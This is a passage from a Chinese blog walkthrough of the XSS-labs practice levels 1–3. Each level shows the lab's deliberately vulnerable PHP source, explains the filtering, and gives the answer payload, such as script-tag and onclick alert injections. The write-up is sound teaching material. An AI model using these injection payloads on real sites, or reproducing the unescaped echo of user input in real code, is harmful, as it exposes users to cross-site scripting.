class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-labs%E9%A2%98%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">XSS-labs题解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number"></span> <span class="toc-text">标签内，而例如、等标签内均可插入标签来执行JavaScript恶意代码&lt;&#x2F;p&gt;
&lt;p&gt;此处可以参考：&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;blog.csdn.net&#x2F;LYJ20010728&#x2F;article&#x2F;details&#x2F;116462782&quot;&gt;XSS常见的触发标签&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202143032203.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202143032203.png&quot; alt&#x3D;&quot;image-20240202143032203&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;!DOCTYPE &lt;span class&#x3D;&quot;keyword&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!--STATUS OK--&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;meta&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;http-equiv&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;content&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;alert&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#123;     &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;title function_&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt; &lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;location&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level2.php?keyword&#x3D;test&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level1&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;align&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level1&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;ini_set(&quot;display_errors&quot;, 0);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str &#x3D; $_GET[&quot;name&quot;];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;&#x2F;&#x2F;这里直接进行调用，根本没有过滤&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;level1.png&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 2&lt;&#x2F;p&gt;
&lt;p&gt;可以尝试如Level 1的方法但是没有成功，再次查看源代码发现第一处的&lt;&gt;符号被html实体转义，只能从第二处进行注入，input标签不可内含script标签，故此处提前闭合input标签，构造一个新的script标签执行恶意代码。&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;1706856310681.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;1706856310681.png&quot; alt&#x3D;&quot;1706856310681&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot;&gt;\&lt;script&gt;alert(1)\&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;!DOCTYPE &lt;span class&#x3D;&quot;keyword&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!--STATUS OK--&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;meta&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;http-equiv&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;content&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;alert&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#123;     &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;title function_&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt; &lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;location&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level3.php?writing&#x3D;wait&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level2&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;align&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level2&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;ini_set(&quot;display_errors&quot;, 0);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str &#x3D; $_GET[&quot;keyword&quot;];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;form action&#x3D;level2.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;.$str.&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;&quot;搜索&quot;&#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;&#x2F;center&gt;&#x27;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;level2.png&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 3&lt;&#x2F;p&gt;
&lt;p&gt;如下图所示，本题过滤了&lt;&gt;和&quot;，经过测试发现 ’ 未被过滤，则可以在input标签内内联JavaScript代码&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202144949589.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202144949589.png&quot; alt&#x3D;&quot;img&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&#39; onclick&#x3D;&#39;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;，然后使用鼠标单击该输入框即可&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
